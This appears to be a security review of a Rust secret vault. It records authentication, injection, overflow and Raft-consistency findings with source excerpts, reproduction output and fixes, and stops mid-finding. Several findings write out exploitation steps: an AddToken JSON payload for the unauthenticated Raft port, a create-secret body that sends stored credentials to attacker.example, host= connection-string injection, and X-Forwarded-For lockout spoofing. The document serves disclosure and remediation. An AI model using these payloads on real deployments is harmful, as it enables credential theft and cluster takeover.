# Security findings

Review date: 2026-09-02. Reviewed at commit `5253e2e` (version 0.9.0).

## Summary

| Id | Finding | Severity | Who can trigger it |
| --- | --- | --- | --- |
| [VULN-1](#vuln-1) | The Raft RPC port is an unauthenticated, fully privileged write API | Critical (needs network reach to the Raft port) | Anyone who can open a TCP connection to the Raft port |
| [VULN-15](#vuln-15) | A rotation target reads any other secret with no authorization and sends its plaintext credentials to a caller-chosen host | Critical | A token with `create` on any path |
| [VULN-18](#vuln-18) | A snapshot with no `last_log_id` writes a JSON `null` that no reader can parse, and the node cannot start again | High | A Raft peer, or VULN-1 |
| [VULN-9](#vuln-9) | Raft RPC bodies are capped at 2 MiB, below what openraft sends | High | Ordinary use; no attacker needed |
| [VULN-10](#vuln-10) | `POST /v1/restore` writes around Raft and silently diverges one node | High | An admin token |
| [VULN-4](#vuln-4) | The Postgres connection string is built by unescaped `format!` | Medium-High | A token with `create` on any path |
| [VULN-3](#vuln-3) | A failed `/verify` disables secret reads from the same client IP | Medium-High | Any end user of a service that calls `/verify` |
| [VULN-5](#vuln-5) | Unchecked `i64` arithmetic on caller-supplied rotation and grace values | Medium-High | A token with `create` on any path |
| [VULN-2](#vuln-2) | Secret-version keys are not isolated per secret name | Medium | Restore, snapshot install, or VULN-1 |
| [VULN-6](#vuln-6) | A peer-supplied log index of `u64::MAX` breaks node startup | Medium | A Raft peer, or VULN-1 |
| [VULN-7](#vuln-7) | A restored audit row at `u64::MAX` permanently stops audit logging | Medium | An admin token |
| [VULN-8](#vuln-8) | With `VAULT_TRUST_PROXY=true`, one client can lock out another | Medium | Any API client, when the proxy does not strip the header |
| [VULN-16](#vuln-16) | Rotation changes the external Postgres password before the vault commits the new version | Medium | Any failed or concurrent rotation of a `pg_replica` secret |
| [VULN-11](#vuln-11) | `AddToken` does not reject a fingerprint that is already in use | Low | Restore, snapshot install, or VULN-1 |
| [VULN-12](#vuln-12) | Every authenticated management request writes a Raft log entry | Low | Any token holder |
| [VULN-13](#vuln-13) | Secret names are not normalised (`a/../b` and `b` are distinct) | Informational | Any token with `create` |
| [VULN-14](#vuln-14) | An opaque secret may hold an empty value, and `/verify` accepts `""` | Informational | Any token with `create` |
| [VULN-19](#vuln-19) | A secret name containing `/` cannot be read, updated, deleted, rotated or verified through its own URL | Medium (correctness) | Ordinary use; the documented examples all use such names |
| [VULN-17](#vuln-17) | The shipped example configuration is fully open and contains a working master key | Informational (hardening) | Anyone who follows the quick start |

---

<a id="vuln-1"></a>
## VULN-1 — The Raft RPC port is an unauthenticated, fully privileged write API

**Severity:** Critical, conditional on network reach to the Raft port.
**Evidence:** read from source. Not exercised against a running cluster.

`crates/hyperion-vault-api/src/raft/server.rs:15-23` builds the Raft router:

```rust
pub fn router(raft: Raft) -> Router {
    Router::new()
        .route("/raft/append", post(append))
        .route("/raft/snapshot", post(snapshot))
        .route("/raft/vote", post(vote))
        .route("/raft/apply", post(apply))
        .route("/raft/initialized", get(initialized))
        .with_state(raft)
}
```

There is no authentication layer, no peer allowlist, no shared cluster secret,
no client-certificate check and no TLS. `crates/hyperion-vault-api/src/lib.rs:91-97`
binds it on `0.0.0.0:<peer port>` whenever `VAULT_PEERS` lists more than one node.

`POST /raft/apply` (`raft/server.rs:55-60`) deserialises an arbitrary
`store::Command` from the request body and submits it to the state machine:

```rust
async fn apply(State(raft): State<Raft>, Json(command): Json<Command>) -> Response {
    match raft.client_write(command).await { ... }
}
```

So a single unauthenticated HTTP POST to the current leader runs any command in
`store::model::Command`. The direct escalation is `AddToken`: the attacker
picks a token, computes its SHA-256, and posts

```json
{"AddToken":{"token":{"name":"x","role":"admin","fingerprint":[<sha256 bytes>],
  "created_at":0,"last_used_at":null,"revoked_at":null}}}
```

`admin` is the built-in superuser role seeded on first start
(`store/engine.rs:79-105`). The attacker now holds an admin bearer token for the
normal API.

That token is not only administrative. `POST /v1/secrets/{name}/rotate` returns
the **new plaintext value** in its response body (`service.rs:381-390`), and
`PUT /v1/secrets/{name}` sets a chosen value. So an attacker with an admin token
learns and controls the material of every rotatable secret from that point on,
and can create, update and delete secrets, roles and tokens.

`/raft/apply` is not the only route with this reach:

- `/raft/vote` and `/raft/append` let an unauthenticated caller present a higher
  term, force the current leader to step down, and then overwrite the replicated
  log — a cluster takeover that does not depend on `/raft/apply` at all.
- `/raft/snapshot` hands a peer-supplied blob to `StateMachine::install_snapshot`
  (`raft/store.rs:477-530`), which clears and rewrites the secrets, versions,
  roles, tokens and token-index tables from raw rows with no validation. That is
  also the delivery path for VULN-2 and VULN-6.

**What the documentation does and does not say.** `docs/SECURITY.md:64-67` says
Raft RPC is plain HTTP on the internal Raft port and that the cluster should run
on a private network, with the WireGuard overlay as the supported way to do it.
The docker compose keeps `:7400` internal. What is not stated anywhere — and what
`docs/THREAT_MODEL.md` has no row for — is that the port is a complete,
unauthenticated administrative write interface. Under the documented deployment
the vault's entire access-control model rests on network reachability alone, so
any SSRF in a co-located service, any container escape, any host that joins the
overlay, or any firewall mistake is a total compromise rather than a
defence-in-depth failure.

**Suggested direction.** Require a shared cluster credential (or mutual TLS) on
every `/raft/*` route and reject requests that do not carry it; check that the
`vote.leader_id` of an incoming RPC belongs to a configured peer id; and treat
`/raft/apply` as the highest-value route — it exists only so a follower can
forward a client write (`raft/node.rs:179-201`), so it can carry the same
credential.

---

<a id="vuln-15"></a>
## VULN-15 — A rotation target reads any other secret with no authorization and sends its plaintext credentials to a caller-chosen host

**Severity:** Critical. Requires only a token with `create` permission on some
secret path — the lowest management privilege the RBAC model can grant.
**Evidence:** read from source.

`service.rs:552-574`:

```rust
async fn apply_target(state, name, current_version, target, role_username, new_password) -> ApiResult<()> {
    match target {
        RotationTarget::PgReplica(pg) => {
            let login = match &pg.login_secret {
                Some(login) if login != name => load_current_userpass(state, login).await?,
                _ => load_userpass(state, name, current_version).await?,
            };
            let role = pg.role.clone().unwrap_or_else(|| role_username.to_string());
            pg_apply::apply_password(pg, &login.username, &login.password, &role, new_password).await
            ...
```

`load_current_userpass` (`service.rs:576-584`) decrypts the current version of
whatever secret it is named and returns the username and password in plaintext.
It performs **no** authorization check, no visibility check and no allowlist
check. The name comes straight from `login_secret` in the `RotationTarget`
embedded in a create-secret request body (`store/model.rs:27-36`,
`dto.rs:22-23`), and the only permission the caller needed was `create` on the
secret they are creating.

`pg_apply::apply_password` (`pg_apply.rs:10-48`) then connects to
`target.hosts[0]` — also from the request body — with `NoTls`
(`pg_apply.rs:64`) and sends `user=<login.username> password=<login.password>`
in the connection string.

The full sequence, from a token whose role grants only
`{"action":"create","path":"myapp/*"}`:

1. `POST /v1/secrets` creating `myapp/x` as `kind: automatic`,
   `username`/`password` set (so the format is `userpass`),
   `rotation_interval_secs: 1`, and

   ```json
   "target": {"type":"pg_replica",
              "hosts":["attacker.example:5432"],
              "database":"postgres",
              "login_secret":"db/root"}
   ```

2. Within one rotation-worker tick (15 seconds by default) the leader rotates
   `myapp/x`, decrypts `db/root`, and opens an unencrypted Postgres connection to
   `attacker.example:5432` carrying `db/root`'s username and password.

The attacker never needed read access to `db/root`, never needed to be on the
read allowlist, and never needed an admin token. The secret's plaintext leaves
the process by design, over a channel the attacker chose.

Two further capabilities from the same object:

- `pg.role` selects which Postgres role's password `replica.rotate_credential`
  is asked to change. Pointed at a **legitimate** host from `hosts`, a caller
  with `create` can ask the vault to change the password of an arbitrary role —
  `postgres`, for instance — using the vault's own stored database credential.
  Whether that succeeds depends on the `replica.rotate_credential` function,
  which is outside this repository.
- `hosts` and `database` are also the injection points for [VULN-4](#vuln-4).

**Suggested direction.** Authorize `login_secret` the way any other read of that
secret would be authorized — at minimum require that the actor's role covers it,
and reject a `login_secret` naming a secret the actor cannot otherwise reach.
Restrict `hosts` to an operator-configured allowlist of Postgres endpoints
rather than accepting a free-form host from a request body, and require TLS for
the connection that carries a stored credential.

---

<a id="vuln-18"></a>
## VULN-18 — A snapshot with no `last_log_id` writes a JSON `null` that no reader can parse

**Severity:** High (availability; a poison pill that survives restarts).
**Evidence:** reproduced for the encode/decode step. Output below. The write and
read sites are quoted from source; not exercised against a running cluster.

The Raft metadata table stores one JSON document per key. `install_snapshot`
writes `last_applied` from an **`Option<LogId>`** (`raft/store.rs:502-505`):

```rust
let lbytes = serde_json::to_vec(&meta.last_log_id).map_err(write_err)?;
table.insert(META_APPLIED, lbytes.as_slice()).map_err(write_err)?;
```

Every reader asks for a **bare `LogId`** (`raft/store.rs:145-157`, called as
`let applied: Option<LogId<NodeId>> = read_meta(db, META_APPLIED)?`, so the
generic parameter is `LogId`, not `Option<LogId>`):

```rust
match table.get(key).map_err(read_err)? {
    Some(value) => Ok(Some(serde_json::from_slice(value.value()).map_err(read_err)?)),
    None => Ok(None),
}
```

When `meta.last_log_id` is `None` the stored bytes are the four characters
`null`, and `serde_json::from_slice::<LogId>(b"null")` fails. `read_meta` maps
that to a `StorageError`, so from that moment on every one of these fails:

- `applied_state` (`raft/store.rs:396-409`) — openraft calls it on startup;
- `build_snapshot` (`raft/store.rs:344-346`);
- `get_log_state` (`raft/store.rs:223`) and `normalize_raft_log`
  (`raft/store.rs:39-42`).

`normalize_raft_log` runs before the Raft node is constructed
(`raft/node.rs:42-43`) and its error is propagated with `?`, so `build_state`
fails and the process exits. The `null` is on disk, so it fails again on the
next start. The node is permanently unable to boot, and the recovery path in
`RaftNode::start` that discards local Raft state (`raft/node.rs:51-67`) is never
reached, because the failure happens before `build_raft` is called.

Note the contrast: `apply` (`raft/store.rs:449-454`) writes a bare `LogId` to
the same key, and it reads back correctly. Only `install_snapshot` writes the
`Option`.

Reachable two ways: a leader whose state machine has applied nothing produces a
snapshot with `last_log_id: None` (`build_snapshot` copies `last_applied`
straight into the meta), and — with no authentication on `/raft/snapshot`
(VULN-1) — any caller can send `"meta":{"last_log_id":null,...}` deliberately.

Reproduction of the encode/decode mismatch:

```
== VULN-18: install_snapshot writes Option<LogId>, every reader parses LogId ==
  written for last_log_id = None : null
  written for last_log_id = Some : {"leader_id":{"term":7,"node_id":1},"index":42}

  read back after None: ERROR: invalid type: null, expected struct LogId at line 1 column 4
  read back after Some: ok, index 42

  apply() writes a bare LogId    : {"leader_id":{"term":7,"node_id":43},"index":43}
  read back                      : Ok(43)
```

**Suggested direction.** Write the same shape the readers parse — store
`meta.last_log_id` only when it is `Some`, and remove the key otherwise; or
change `read_meta` to be called with `T = Option<LogId>` at this key. Add a
startup path that tolerates unparseable Raft metadata rather than refusing to
boot.

---

<a id="vuln-9"></a>
## VULN-9 — Raft RPC bodies are capped at 2 MiB, below what openraft sends

**Severity:** High (availability and correctness). No attacker required.
**Evidence:** read from source, plus the two upstream defaults quoted below.

The Raft router (`raft/server.rs:15-23`) installs no `DefaultBodyLimit`. Axum
therefore applies its built-in default to every `Json` extractor:

```
axum-core-0.5.6/src/ext_traits/request.rs:319
    const DEFAULT_LIMIT: usize = 2_097_152; // 2 mb
```

The public API router does set its own limits (`routes.rs:18,40,44` — 1 MiB in
general, 256 MiB for restore). The Raft router was never given one.

The pinned openraft defaults are larger than that:

```
openraft-0.9.25/src/config/config.rs:174-175   snapshot_max_chunk_size = 3MiB
openraft-0.9.25/src/config/config.rs:152-153   max_payload_entries     = 300
```

`raft/node.rs:33-38` overrides only the heartbeat and election timeouts, so both
of those defaults are in force.

Two consequences:

1. **Snapshot install can never succeed for a non-trivial vault.**
   `InstallSnapshotRequest.data` is a `Vec<u8>`, and `serde_json` encodes a byte
   vector as a decimal array — roughly 3 to 4 bytes of JSON per byte of payload.
   A chunk therefore crosses 2 MiB of JSON at around 600 KiB of raw snapshot
   data, while openraft will build chunks up to 3 MiB. Once a vault's snapshot
   exceeds that, `POST /raft/snapshot` returns 413 and the follower can never be
   caught up by a snapshot again.
2. **Append can stall under ordinary write bursts.** A single `CreateSecret`
   entry with a 64 KiB value (`MAX_VALUE_LEN`, `service.rs:24`) is roughly
   250 KiB of JSON once the ciphertext is expanded. openraft batches up to 300
   entries per `AppendEntriesRequest`, so a burst of about a dozen large writes
   produces a body over 2 MiB.

In both cases the follower answers HTTP 413. `raft/network.rs:69-74` reads the
body and fails to deserialise it into the expected response type, which becomes
`RPCError::Network`; openraft treats that as a transient transport failure and
retries, without shrinking the payload. Replication stops making progress and
nothing in the logs points at a size limit — the visible symptom is a peer that
looks unreachable.

**Suggested direction.** Put an explicit `DefaultBodyLimit` on the Raft router,
sized above `snapshot_max_chunk_size` times the JSON expansion factor, and lower
`snapshot_max_chunk_size` and `max_payload_entries` in `raft/node.rs`. Better
still, stop sending binary payloads as JSON number arrays — base64 for the
snapshot `data` field, or an `application/octet-stream` body.

---

<a id="vuln-10"></a>
## VULN-10 — `POST /v1/restore` writes around Raft and silently diverges one node

**Severity:** High (integrity). Requires an admin token.
**Evidence:** read from source.

`raft/node.rs:300-302`:

```rust
async fn restore(&self, data: BackupData) -> StoreResult<()> {
    self.node.store.restore(data).await
}
```

`self.node.store` is the local `RedbStore`. Unlike `apply`, which routes
non-local commands through `self.node.write(command)` and therefore through
consensus, `restore` writes straight into this node's copy of the state machine.

`raft_meta.last_applied` is not touched, so Raft has no idea the state machine
changed. The node keeps applying subsequent log entries on top of the restored
rows, while every other node applies them on top of the old ones. The cluster is
now silently divergent for every table the backup covers: secrets, versions,
roles, tokens, the token index and the KMS re-wrap watermark.

The divergence is not self-limiting. If the restored node later becomes leader,
`RaftSnapshotBuilder::build_snapshot` (`raft/store.rs:343-390`) dumps whatever is
currently in its redb, so the restored state is what gets shipped to every
follower.

`docs/SECURITY.md:12` states that writes are committed via Raft consensus to a
quorum before they are acknowledged. Restore is a write, and it is not.

**Suggested direction.** Either refuse `POST /v1/restore` when
`state.raft.is_some()` and document restore as an offline procedure with the
whole cluster stopped, or replicate it — add a `RestoreDatabase` command, or
have the leader restore and then force a snapshot that followers install.

---

<a id="vuln-4"></a>
## VULN-4 — The Postgres connection string is built by unescaped `format!`

**Severity:** Medium-High. Requires a token with `create` on some secret path.
**Evidence:** reproduced. Output below. The reproduction corrected two things I
had assumed before running it — see "What the output actually shows".

`crates/hyperion-vault-api/src/pg_apply.rs:60-62`:

```rust
let config = format!(
    "host={host} port={port} dbname={database} user={user} password={password} connect_timeout=3"
);
```

The SQL statement itself is parameter-bound (`$1`, `$2`) and is fine. The
connection string is not. Its keyword/value syntax separates fields on
whitespace, so any value containing a space or an `=` changes the meaning of the
whole string.

`host` and `database` come from the `RotationTarget` embedded in a create-secret
request body (`dto.rs:22-23`, `store/model.rs:27-36`), which any token with
`create` permission on some path can set. `user` and `password` come from a
stored userpass secret. None of the five values is validated or escaped.

**What the output actually shows.**

1. A `host=` injected into `database` or into a `hosts` entry is **appended** to
   the connection's host list rather than replacing the configured host —
   `tokio_postgres::Config` collects every `host=` and tries them in order. So
   the injected server is contacted only as a fallback, when the real one is
   unreachable. It is still an attacker-chosen server receiving the login user
   and password over an unencrypted connection (`NoTls`, `pg_apply.rs:64`), but
   it is a fallback, not a redirect. The direct way to point the vault at a
   chosen server is simply to set `hosts` — that is [VULN-15](#vuln-15).
2. A stored password containing a **space** makes the whole string unparseable
   (`invalid connection string`), so rotation for that secret fails every time,
   with an error that does not say why.
3. A stored password containing a **single quote** parses fine and is passed
   through literally. I expected this to break and it does not; the claim is
   withdrawn.

Reproduction (independent of the fuzz suite; the program rebuilds the exact
`format!` above and parses it with `tokio_postgres::Config::from_str`, the same
parser the vault's connection attempt uses):

```
== VULN-4: the Postgres connection string is built by unescaped format! ==
  benign
    string : host=10.0.0.2 port=5432 dbname=postgres user=vaultadmin password=s3cr3t connect_timeout=3
    hosts  : [Tcp("10.0.0.2")]
    dbname : Some("postgres")
    user   : Some("vaultadmin")
    passwd : Some("s3cr3t")

  database field carries an extra host= (later keyword wins in libpq)
    string : host=10.0.0.2 port=5432 dbname=postgres host=attacker.example user=vaultadmin password=s3cr3t connect_timeout=3
    hosts  : [Tcp("10.0.0.2"), Tcp("attacker.example")]
    dbname : Some("postgres")
    user   : Some("vaultadmin")
    passwd : Some("s3cr3t")

  hosts entry carries an extra host=
    string : host=10.0.0.2 host=attacker.example port=5432 dbname=postgres user=vaultadmin password=s3cr3t connect_timeout=3
    hosts  : [Tcp("10.0.0.2"), Tcp("attacker.example")]
    dbname : Some("postgres")
    user   : Some("vaultadmin")
    passwd : Some("s3cr3t")

  a stored password containing a space truncates the credential
    string : host=10.0.0.2 port=5432 dbname=postgres user=vaultadmin password=pass word connect_timeout=3
    parse error: invalid connection string

  a stored password containing a single quote fails the connection
    string : host=10.0.0.2 port=5432 dbname=postgres user=vaultadmin password=pass'word connect_timeout=3
    hosts  : [Tcp("10.0.0.2")]
    dbname : Some("postgres")
    user   : Some("vaultadmin")
    passwd : Some("pass'word")

== VULN-9: split_hostport mis-parses a bracketed IPv6 literal with no port ==
  "[::1]:5432" -> ("[::1]", 5432)
  "[::1]" -> ("[:", 5432)
  "db" -> ("db", 5432)
  "db:99999" -> ("db", 5432)
```

**Suggested direction.** Build the connection string through
`tokio_postgres::Config` setters rather than text, or write a quoting helper
(wrap every value in single quotes, escaping `\` and `'`) and fuzz that it
round-trips — `fuzz/README.md` lists this under ideas for more coverage.

---

<a id="vuln-3"></a>
## VULN-3 — A failed `/verify` disables secret reads from the same client IP

**Severity:** Medium-High (availability).
**Evidence:** reproduced through the HTTP router. Output below.

`service.rs:433`, at the end of an unsuccessful verify:

```rust
lockout::record(state, Some(IpAddr::V4(client_ip))).await;
```

`guards.rs:88`, before every secret read:

```rust
lockout::check_ip(state, ip).await?;
```

Both use one counter, keyed only by client IP (`lockout.rs:32-49`). There is no
separation between "this client presented a bad admin token" and "an end user of
this client typed the wrong password".

`POST /v1/secrets/{name}/verify` exists so a service can validate a user-supplied
password against the current and grace-window versions of a secret. Every wrong
end-user password therefore consumes the *calling service's* lockout budget.
After `VAULT_AUTH_MAX_FAILURES` (default 5) failures inside
`VAULT_AUTH_WINDOW_SECS` (default 300), that IP receives HTTP 429 on
`GET /v1/secrets/{name}` and `POST /v1/batch/secrets` for
`VAULT_AUTH_LOCKOUT_SECS` (default 900).

The result is that ordinary user error takes an application server offline from
its own secret store for fifteen minutes, and any end user can cause it
deliberately.

Reproduction (allowlist `10.0.0.0/24`, `auth_max_failures = 3`):

```
== VULN-3: end-user password failures on /verify disable secret reads ==
  GET  /v1/secrets/db-password from 10.0.0.5 -> 200 OK
  POST .../verify  (wrong end-user password #1)  -> 200 OK
  POST .../verify  (wrong end-user password #2)  -> 200 OK
  POST .../verify  (wrong end-user password #3)  -> 200 OK
  GET  /v1/secrets/db-password from 10.0.0.5 -> 429 Too Many Requests  <-- the app server can no longer read its own secrets

== VULN-8: with VAULT_TRUST_PROXY=true one client can lock out another ==
  GET from the victim 10.0.0.5 -> 200 OK
  attacker at 203.0.113.9 sends X-Forwarded-For: 10.0.0.5 (#1) -> 200 OK
  attacker at 203.0.113.9 sends X-Forwarded-For: 10.0.0.5 (#2) -> 200 OK
  attacker at 203.0.113.9 sends X-Forwarded-For: 10.0.0.5 (#3) -> 200 OK
  GET from the victim 10.0.0.5 -> 429 Too Many Requests  <-- locked out by a third party
```

**Suggested direction.** Count verify failures in a namespace of their own — key
them by `(client ip, secret name)` and let them gate only `/verify` — so a
password-checking failure cannot revoke a service's ability to read secrets.

---

<a id="vuln-5"></a>
## VULN-5 — Unchecked `i64` arithmetic on caller-supplied rotation and grace values

**Severity:** Medium-High. Requires a token with `create` on some path.
**Evidence:** reproduced in a release build (overflow checks off, as in
production). Output below.

`service.rs` adds caller-supplied second counts to the current time with plain
`+`:

| Line | Expression | Where the value comes from |
| --- | --- | --- |
| `service.rs:59` | `now + secs` | `rotation_interval_secs`, only checked `> 0` |
| `service.rs:261`, `370` | `now + secret.grace_secs` | `grace_period_secs`, only checked `>= 0` |
| `service.rs:266`, `281`, `374` | `now + effective_interval` | as above |
| `service.rs:254`, `325` | `current_version + 1` | `current_version`, `i32` |

`Cargo.toml` sets `opt-level = 3` for release and leaves `overflow-checks`
unset, so release builds wrap silently, which is the worse outcome of the two:

- `rotation_interval_secs: i64::MAX` wraps `next_rotation_at` to a negative
  timestamp. `due_rotations` (`store/engine.rs:207-223`) selects any secret whose
  `next_rotation_at <= now`, so the rotation worker rotates that secret on
  **every** tick — every 15 seconds by default (`VAULT_ROTATION_POLL_SECS`).
  Each rotation is one AWS KMS `GenerateDataKey` call and one replicated version
  row, forever. A caller asking for "rotate roughly never" gets a permanent
  rotation loop, unbounded KMS spend, and unbounded storage growth.
- `grace_period_secs: i64::MAX` wraps the superseded version's `expires_at` into
  the past, so `live_versions` stops returning the previous version immediately
  and `ExpireGraceVersions` deletes it on the next tick — again the exact
  opposite of the request.

In a debug build the same inputs panic inside the request handler instead.

`hyperion_vault_core::rotation::RotationPolicy` already implements this
arithmetic with `saturating_add` (`rotation.rs:14-20`). `service.rs` does not
call it.

Reproduction:

```
== VULN-5: unchecked i64 arithmetic on caller-supplied rotation/grace values ==
  now = 1788348117
  requested rotation_interval_secs = Some(9223372036854775807)
  stored next_rotation_at          = Some(-9223372035066427692)
  is that in the past?             = true
  rotation worker sees it as due   = true

  requested grace_period_secs      = 9223372036854775807
  superseded version 1 expires_at  = Some(-9223372035066427692)
  already expired at now?          = true
  live versions now                = [2]
```

**Suggested direction.** Route the three expressions through
`core::rotation::RotationPolicy`, add a `next_version(current: i32) -> Option<i32>`
that returns `None` at `i32::MAX` instead of wrapping, and bound
`rotation_interval_secs` and `grace_period_secs` to a sane maximum at the DTO
boundary.

---

<a id="vuln-2"></a>
## VULN-2 — Secret-version keys are not isolated per secret name

**Severity:** Medium (High if VULN-1 is reachable).
**Evidence:** reproduced two ways. The `store_key_encoding` fuzz target hits the
range-isolation assertion after 436 executions:

```
#436  NEW    cov: 97 ft: 108 corp: 5/33b lim: 8 exec/s: 0 rss: 43Mb

thread '<unnamed>' panicked at fuzz_targets\store_key_encoding.rs:62:13:
another secret's version row fell inside this secret's scan range
```

and the deterministic program below shows both defects directly.

`store/engine.rs:28-38` builds version keys and scan bounds by string
concatenation:

```rust
pub fn version_key(name: &str, version: i32) -> String { format!("{name}\u{0}{version:010}") }
pub fn version_lower(name: &str) -> String { format!("{name}\u{0}") }
pub fn version_upper(name: &str) -> String { format!("{name}\u{1}") }
```

A secret whose **name contains a NUL byte** places its version rows inside a
different secret's scan range. Two independent defects fall out of the same
function; both are in the output below:

1. The version rows of `"x\0y"` sort inside `version_lower("x") ..< version_upper("x")`.
2. Negative version numbers sort backwards (`{version:010}` counts the minus sign
   inside the width), and `i32::MIN` produces an 11-character field that breaks
   the fixed-width ordering the scan relies on.

**How a NUL name gets in.** `service::validate_name` (`service.rs:690-705`)
restricts names to `[A-Za-z0-9-_/.]` on the create path. Three write paths never
call it:

- `store::backup::restore_database` (`POST /v1/restore`) inserts raw key/value
  rows.
- `StateMachine::install_snapshot` (`raft/store.rs:477-530`) inserts raw rows
  from a peer.
- `Command::CreateSecret` submitted to `/raft/apply` (VULN-1).

**What it costs.** Two scans use those bounds:

- `Command::DeleteSecret` (`store/apply.rs:133-158`) deletes everything in the
  range, so deleting `x` also deletes the version rows of `x\0y`. The `x\0y`
  entry in the `secrets` table survives with no versions behind it, so reads of
  it return 404. That is silent destruction of a different secret's data.
- `live_versions` (`store/engine.rs:170-189`) returns the other secret's version
  rows, and `verify` feeds each of them to `open_version`.

**A correction to `todo.md` §2.1.** That note predicts `/verify` could return
`valid: true` for another secret's password. It cannot. `open_version`
(`service.rs:634-639`) compares the stored `aad` against `aad_for(name, version)`
and rejects a mismatch before decrypting, and `aad_for` is unambiguous for any
pair of (name, version) because the version is always `[-]digits`. The
cross-secret rows therefore turn `/verify` into an HTTP 500 rather than a
disclosure. The deletion and the availability loss are real; the value
disclosure is not.

Reproduction:

```
== VULN-2: version-key ranges are not disjoint across secret names ==
  secret "x" scan range   = "x\0" ..< "x\u{1}"
  secret "x\0y" version 1 key = "x\0y\00000000001"
  attacker row inside victim range = true

== VULN-2b: negative version numbers sort backwards ==
  version_key(n,-1) = "n\0-000000001"  version_key(n,-2) = "n\0-000000002"  byte_order_says_-1<-2 = true  numeric = false
  version_key(n,-2147483648) = "n\0-2147483648"  version_key(n,1) = "n\00000000001"  byte_order_says_-2147483648<1 = true  numeric = true
  i32::MIN field width = 11 (the encoding assumes 10)
```

**Suggested direction.** Pick one and make the fuzz target green: either escape
or length-prefix the name inside the key, or validate names on **every** write
path (restore, snapshot install, and command apply) rather than only on create.
Separately, encode the version as an unsigned, order-preserving fixed-width
field, or reject a version below 1.

---

<a id="vuln-6"></a>
## VULN-6 — A peer-supplied log index of `u64::MAX` breaks node startup

**Severity:** Medium (High with VULN-1).
**Evidence:** read from source. The `raft_log_normalize` fuzz target skips this
input on purpose, so that it can reach the properties it was written for.

`raft/store.rs:47`, in `normalize_raft_log`:

```rust
let start = floor.map(|index| index + 1).unwrap_or(0);
```

and `raft/store.rs:222`, in `get_log_state`:

```rust
(sp, Some(first)) if sp.map(|p| p.index + 1).unwrap_or(0) < first => { ... }
```

Both additions are unchecked. `floor` is `last_applied.index`, falling back to
`last_purged.index`.

`StateMachine::install_snapshot` (`raft/store.rs:510-515`) writes both
`last_applied` and `last_purged` verbatim from `meta.last_log_id`, which arrives
inside the peer's `InstallSnapshotRequest`. Nothing bounds it. Combined with the
missing authentication on `/raft/snapshot` (VULN-1), an unauthenticated caller
can plant `index = u64::MAX` on disk.

`normalize_raft_log` runs on every start (`raft/node.rs:43`):

- Debug build: the node panics during startup. The value is on disk, so the node
  panics again on the next start — a permanent crash loop.
- Release build (overflow checks off): `u64::MAX + 1` wraps to `0`, so `start`
  becomes 0 and the log is treated as contiguous-from-zero. Everything above the
  first gap is then deleted.

**Suggested direction.** Use `checked_add`/`saturating_add` at both sites, and
reject an `InstallSnapshotRequest` whose `last_log_id.index` is not plausible
relative to the local log.

---

<a id="vuln-7"></a>
## VULN-7 — A restored audit row at `u64::MAX` permanently stops audit logging

**Severity:** Medium. Requires an admin token (or VULN-1).
**Evidence:** reproduced in a release build. Output below.

`store/apply.rs:322-334`, appending an audit entry:

```rust
let next: u64 = match audit.last().map_err(err)? {
    Some((key, _value)) => key.value() + 1,
    None => 0,
};
```

`BackupData.audit` carries raw `u64` keys (`store/backup.rs:17`) and
`restore_database` writes them with no validation (`store/backup.rs:136-153`).
A backup file containing a single audit row keyed `u64::MAX` is enough.

In a release build every subsequent `AppendAudit` computes `u64::MAX + 1`, wraps
to `0`, and overwrites the same row. The audit log then holds exactly two rows
forever — the planted one and whatever the most recent event was. In a debug
build the same append panics.

`docs/THREAT_MODEL.md` lists "Repudiation → append-only `vault.audit_log` with
actor/IP/action/outcome" as a mitigation. This defeats it silently: the API keeps
returning success and nothing in the logs says the audit trail stopped growing.

Backups are files. They are copied to object storage, restored by operators, and
handled by systems that are usually less trusted than the vault itself, so a
tampered backup is a realistic input even though the restore endpoint requires
an admin token.

Reproduction:

```
== VULN-7: a restored audit key of u64::MAX permanently breaks the audit log ==
  restored one audit row at key u64::MAX
  AppendAudit(create) -> ok
  AppendAudit(rotate) -> ok
  AppendAudit(delete) -> ok
  audit rows now = 2
    key                    0 -> action "delete"
    key 18446744073709551615 -> action "planted"
  (three appends, one surviving row: every append overwrote key 0)
```

**Suggested direction.** Use `checked_add` and fail the command instead of
wrapping, and validate the audit key range during restore.

---

<a id="vuln-8"></a>
## VULN-8 — With `VAULT_TRUST_PROXY=true`, one client can lock out another

**Severity:** Medium, conditional on `trust_proxy`.
**Evidence:** reproduced through the HTTP router. Output below.

`guards.rs:113-126` takes the first comma-separated field of `X-Forwarded-For`
as the client address whenever `trust_proxy` is on. That address is then used for
two different things: the read allowlist check, and — via `lockout::record`
(`lockout.rs:39-45`) — the **key of the brute-force lockout table**.

`docs/SECURITY.md:71-74` warns that the allowlist can be spoofed if the proxy
does not strip inbound `X-Forwarded-For`. It does not mention the second use.
Because the lockout key is equally attacker-controlled, the same misconfiguration
gives two more capabilities:

- **Evasion.** A caller can reset its own failure counter on every request by
  varying the header, so the lockout never triggers.
- **Denial of service against a third party.** A caller can fail `/verify` while
  claiming a victim's address, and the victim — a legitimate allowlisted service
  — is locked out of secret reads for `VAULT_AUTH_LOCKOUT_SECS`.

Reproduction (`trust_proxy = true`, allowlist `10.0.0.0/24`, victim `10.0.0.5`,
attacker connecting from `203.0.113.9`) — the second half of the VULN-3 output
below.

**Suggested direction.** When a proxy is trusted, key the lockout on the
transport peer address (the proxy), not on the forwarded address; or take the
forwarded address from a fixed position counted from the right, based on a
configured proxy hop count.

---

<a id="vuln-16"></a>
## VULN-16 — Rotation changes the external Postgres password before the vault commits the new version

**Severity:** Medium (availability, credential loss).
**Evidence:** read from source.

`service::rotate` (`service.rs:306-391`) performs the external side effect first
and the durable write second:

```rust
if let (Some(target), SecretFormat::Userpass) = (&secret.target, secret.format) {
    apply_target(state, name, current_version, target, &username, &password).await?;   // line 358
}
let version = seal_version(state, name, new_version, &payload.bytes, now).await?;
state.store.apply(Command::PutVersion { ... }).await?;                                 // line 364-377
```

The new password exists only in the in-memory `payload` until `PutVersion`
commits. If the store write fails — no Raft leader, a `VersionConflict` from a
concurrent rotation, a KMS error in `seal_version` — Postgres already holds the
new password and nothing does. There is no rollback and no retry of the write.

The damaging case is a secret that rotates its **own** login. With
`login_secret` unset (or equal to the secret's own name), `apply_target` logs in
with `load_userpass(state, name, current_version)` — the credentials the vault
currently stores. After a failed rotation those are stale, so the next attempt
cannot authenticate either. The role is locked out permanently until an operator
resets the password by hand.

A second path to the same state: `POST /v1/secrets/{name}/rotate` is served by
whichever node receives it (`routes.rs:113-122`) and is not leader-gated — only
the background worker checks for leadership (`rotation_worker.rs:52-57`). Two
concurrent rotations therefore both change the Postgres password; the store's
